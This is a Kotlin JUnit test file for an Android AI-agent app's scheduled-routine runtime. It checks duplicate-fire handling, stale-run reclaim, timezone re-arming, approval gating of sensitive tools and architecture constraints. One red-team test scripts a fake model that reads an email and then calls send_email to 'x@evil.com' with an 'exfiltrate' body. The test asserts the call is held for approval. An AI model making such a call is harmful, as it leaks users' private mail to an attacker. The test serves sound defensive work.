package com.aira.agent

import java.io.File
import java.time.ZoneId
import java.time.ZonedDateTime
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

// Ticket #80 (T3): one fire seam behind a thin Worker. fireSchedule owns
// claim, allowlisted run, finish/record, and next-arm computation; the
// Worker only builds dependencies, calls fire, posts notifications, and
// arms. Receivers stay enqueue-only with no inline database work.
class ScheduleRuntimeTest {

    private class FakeRuntimeGmail(var expired: Boolean = false) : GmailApi {
        val sentRaws = mutableListOf<String>()
        private val rows = listOf(EmailSummary("m1", "boss@work.com", "Q3 plan", "draft", true))

        override fun send(rawBase64Url: String) {
            sentRaws += rawBase64Url
        }

        override fun listInbox(): List<EmailSummary> {
            if (expired) throw GmailException(401, "gmail is not connected: token expired")
            return rows
        }

        override fun searchInbox(query: String, max: Int): List<EmailSummary> {
            if (expired) throw GmailException(401, "gmail is not connected: token expired")
            return rows.take(max.coerceIn(1, 25))
        }

        override fun readMessage(id: String): EmailDetail {
            if (expired) throw GmailException(401, "gmail is not connected: token expired")
            val row = rows.first { it.id == id }
            return EmailDetail(row.id, row.from, row.subject, row.snippet, "body text", emailSource(row.id))
        }
    }

    private fun fullRegistry(gmail: FakeRuntimeGmail): ToolRegistry =
        defaultToolRegistry(gmailApi = gmail, scheduleStore = InMemoryScheduleStore(), memoryStore = InMemoryStore())

    private fun answer(text: String) = LlmResult(toolCalls = emptyList(), content = text)

    private fun fire(
        scheduleId: String,
        fireTime: Long,
        store: ScheduleStore,
        runs: ScheduleRunStore,
        approvals: PendingApprovalStore,
        llm: ChatLlmProvider,
        registry: ToolRegistry,
        zone: ZoneId = ZoneId.of("UTC"),
        now: ZonedDateTime = ZonedDateTime.of(2026, 11, 23, 7, 0, 0, 0, zone),
        nowMs: () -> Long = { fireTime + 50 },
    ): FireOutcome =
        fireSchedule(scheduleId, fireTime, store, zone, now) { schedule ->
            runScheduledRoutine(schedule, fireTime, llm, registry, runs, approvals, nowMs = nowMs)
        }

    // --- Double delivery runs once, no second LLM call. ---

    @Test
    fun doubleDeliveryOfSameFireTimeRunsOnce() {
        val store = InMemoryScheduleStore()
        val schedule = store.save("check emails", 9, 0)
        val gmail = FakeRuntimeGmail()
        val llm = FakeLlmProvider(listOf(answer("morning summary")))
        val runs = InMemoryScheduleRunStore()
        val approvals = InMemoryPendingApprovalStore()
        val registry = fullRegistry(gmail)
        val zone = ZoneId.of("UTC")
        val now = ZonedDateTime.of(2026, 11, 23, 7, 0, 0, 0, zone)

        val first = fire(schedule.id, 1_000L, store, runs, approvals, llm, registry, zone, now)
        assertEquals(FireStatus.RAN, first.status)
        assertTrue(first.nextArmMillis != null)
        val seenAfterFirst = llm.seenMessages.size

        val second = fire(schedule.id, 1_000L, store, runs, approvals, llm, registry, zone, now)
        assertEquals(FireStatus.DUPLICATE_SKIPPED, second.status)
        assertEquals(first.run, second.run)
        assertEquals(first.nextArmMillis, second.nextArmMillis)
        assertEquals("second delivery must not reach the LLM", seenAfterFirst, llm.seenMessages.size)
        assertEquals(1, runs.list().size)
    }

    // --- Sensitive attempt becomes PendingApproval, never executes. ---

    @Test
    fun sensitiveAttemptBecomesPendingApprovalNeverExecutes() {
        val store = InMemoryScheduleStore()
        val schedule = store.save("check emails", 9, 0)
        val gmail = FakeRuntimeGmail()
        val llm =
            FakeLlmProvider(
                listOf(
                    LlmResult(listOf(ToolCall("c1", "send_email", mapOf("to" to "x@y.z", "subject" to "Hi", "body" to "b"))), null),
                    answer("Held for your approval"),
                ),
            )
        val runs = InMemoryScheduleRunStore()
        val approvals = InMemoryPendingApprovalStore()
        val outcome = fire(schedule.id, 1_000L, store, runs, approvals, llm, fullRegistry(gmail))
        assertEquals(FireStatus.RAN, outcome.status)
        assertEquals(ScheduleRunStatus.BLOCKED_WRITE, outcome.run!!.status)
        assertEquals(1, outcome.blocked.size)
        assertEquals("send_email", outcome.blocked.single().toolName)
        assertEquals(1, approvals.list().size)
        assertTrue(gmail.sentRaws.isEmpty())
        assertTrue(outcome.notification!!.text.contains("Confirmation"))
        assertTrue(outcome.nextArmMillis != null)
    }

    // --- Send-path red-team through the fire seam. ---

    @Test
    fun evilForwardThroughFireSeamIsHeldNeverExecuted() {
        val store = InMemoryScheduleStore()
        val schedule = store.save("check emails", 9, 0)
        val gmail = FakeRuntimeGmail()
        val llm =
            FakeLlmProvider(
                listOf(
                    LlmResult(listOf(ToolCall("c1", "read_email", mapOf("id" to "m1"))), null),
                    LlmResult(
                        listOf(
                            ToolCall(
                                "c2",
                                "send_email",
                                mapOf("to" to "x@evil.com", "subject" to "Forwarded mail", "body" to "exfiltrate"),
                            ),
                        ),
                        null,
                    ),
                    answer("Routine done."),
                ),
            )
        val approvals = InMemoryPendingApprovalStore()
        val outcome = fire(schedule.id, 1_000L, store, InMemoryScheduleRunStore(), approvals, llm, fullRegistry(gmail))
        assertEquals(FireStatus.RAN, outcome.status)
        assertEquals(ScheduleRunStatus.BLOCKED_WRITE, outcome.run!!.status)
        assertEquals("x@evil.com", outcome.blocked.single().arguments["to"])
        assertTrue(gmail.sentRaws.isEmpty())
        assertTrue(outcome.notification!!.text.contains("Confirmation"))
    }

    // --- Stale RUNNING reclaimed by exactly one winner; fresh duplicates skip. ---

    @Test
    fun staleRunningReclaimedOnceFreshRunningSkips() {
        val store = InMemoryScheduleStore()
        val schedule = store.save("check emails", 9, 0)
        val gmail = FakeRuntimeGmail()
        val registry = fullRegistry(gmail)
        val zone = ZoneId.of("UTC")
        val now = ZonedDateTime.of(2026, 11, 23, 7, 0, 0, 0, zone)
        val fireTime = 1_000L

        // Fresh RUNNING (process still alive) is a genuine duplicate.
        val freshRuns = InMemoryScheduleRunStore()
        freshRuns.claim(schedule.id, fireTime)
        val freshOutcome =
            fire(schedule.id, fireTime, store, freshRuns, InMemoryPendingApprovalStore(), FakeLlmProvider(listOf(answer("x"))), registry, zone, now, nowMs = { fireTime + 1_000L })
        assertEquals(FireStatus.DUPLICATE_SKIPPED, freshOutcome.status)

        // Stale RUNNING (process died between claim and finish) is reclaimed
        // exactly once: one winner re-runs, the next delivery sees the
        // finished row and skips.
        val staleRuns = InMemoryScheduleRunStore()
        staleRuns.claim(schedule.id, fireTime)
        val llm = FakeLlmProvider(listOf(answer("recovered")))
        val reclaimed =
            fire(schedule.id, fireTime, store, staleRuns, InMemoryPendingApprovalStore(), llm, registry, zone, now, nowMs = { fireTime + STALE_RUN_TTL_MS + 1 })
        assertEquals(FireStatus.RAN, reclaimed.status)
        assertEquals(ScheduleRunStatus.SUCCESS, reclaimed.run!!.status)
        val seenAfterReclaim = llm.seenMessages.size
        val after =
            fire(schedule.id, fireTime, store, staleRuns, InMemoryPendingApprovalStore(), llm, registry, zone, now, nowMs = { fireTime + STALE_RUN_TTL_MS + 2 })
        assertEquals(FireStatus.DUPLICATE_SKIPPED, after.status)
        assertEquals(seenAfterReclaim, llm.seenMessages.size)
    }

    // --- Missing schedule and transport failure map with next-arm carried. ---

    @Test
    fun missingScheduleIsTerminalWithNullArmAndNoRun() {
        val store = InMemoryScheduleStore()
        store.save("check emails", 9, 0)
        var called = false
        val outcome =
            fireSchedule("sched_999", 1_000L, store) {
                called = true
                throw AssertionError("runOnce must not run without a Schedule")
            }
        assertEquals(FireStatus.SCHEDULE_MISSING, outcome.status)
        assertNull(outcome.run)
        assertNull(outcome.notification)
        assertNull(outcome.nextArmMillis)
        assertFalse(called)
    }

    @Test
    fun transportThrowBecomesFailedWithNextArmCarried() {
        val store = InMemoryScheduleStore()
        val schedule = store.save("check emails", 9, 0)
        val zone = ZoneId.of("UTC")
        val now = ZonedDateTime.of(2026, 11, 23, 7, 0, 0, 0, zone)
        val expectedArm = nextFireTime(schedule, zone, now)!!.toInstant().toEpochMilli()
        val outcome =
            fireSchedule(schedule.id, 1_000L, store, zone, now) {
                throw RuntimeException("transport down")
            }
        assertEquals(FireStatus.FAILED, outcome.status)
        assertEquals(expectedArm, outcome.nextArmMillis)
        assertNull(outcome.run)
    }

    // --- Timezone re-arm edge: wall-clock time survives zone changes. ---

    @Test
    fun nextArmIsWallClockInFireZone() {
        val store = InMemoryScheduleStore()
        val schedule = store.save("morning summary", 9, 0)
        val zone = ZoneId.of("Asia/Kolkata")
        val now = ZonedDateTime.of(2026, 11, 23, 10, 0, 0, 0, zone)
        val runs = InMemoryScheduleRunStore()
        val outcome =
            fire(schedule.id, 1_000L, store, runs, InMemoryPendingApprovalStore(), FakeLlmProvider(listOf(answer("hi"))), fullRegistry(FakeRuntimeGmail()), zone, now)
        assertEquals(FireStatus.RAN, outcome.status)
        val armed = ZonedDateTime.ofInstant(java.time.Instant.ofEpochMilli(outcome.nextArmMillis!!), zone)
        assertEquals(9, armed.hour)
        assertEquals(0, armed.minute)
        assertEquals(ZonedDateTime.of(2026, 11, 24, 9, 0, 0, 0, zone).toInstant().toEpochMilli(), outcome.nextArmMillis)
    }

    // --- Architecture guards: pure runtime, thin Worker, enqueue-only receivers. ---

    private fun moduleDir(): File {
        var dir = File(System.getProperty("user.dir"))
        while (true) {
            if (File(dir, "src/main/AndroidManifest.xml").exists()) return dir
            dir = dir.parentFile ?: throw AssertionError("Could not locate app module dir from user.dir")
        }
    }

    @Test
    fun runtimeHasNoAndroidImports() {
        val text = File(moduleDir(), "src/main/java/com/aira/agent/ScheduleRuntime.kt").readText()
        assertFalse("fire seam must stay pure JVM-testable", "import android" in text)
        assertFalse("fire seam must not touch Room", "import androidx.room" in text)
        assertFalse("fire seam must not touch WorkManager", "import androidx.work" in text)
    }

    @Test
    fun workerDelegatesToFireAndPerformsArm() {
        val text = File(moduleDir(), "src/main/java/com/aira/agent/ScheduleWork.kt").readText()
        assertTrue(text.contains("fireSchedule("))
        assertTrue(text.contains("registerRoutineAlarm("))
        assertTrue(text.contains("postScheduleNotification("))
        assertTrue(text.contains("postPendingApprovalNotification("))
        assertFalse("Worker must not run the loop directly", "AgentLoop(" in text)
    }

    @Test
    fun receiversDoNoDatabaseWork() {
        val text = File(moduleDir(), "src/main/java/com/aira/agent/ScheduleAlarm.kt").readText()
        for (marker in listOf("Room.databaseBuilder", "ScheduleRunStore", "PendingApprovalStore", "Thread(", "goAsync(")) {
            assertFalse("receivers must only enqueue Workers, found: $marker", marker in text)
        }
        assertTrue(text.contains("enqueueRoutineWork("))
        assertTrue(text.contains("enqueueRescheduleWork("))
    }
}
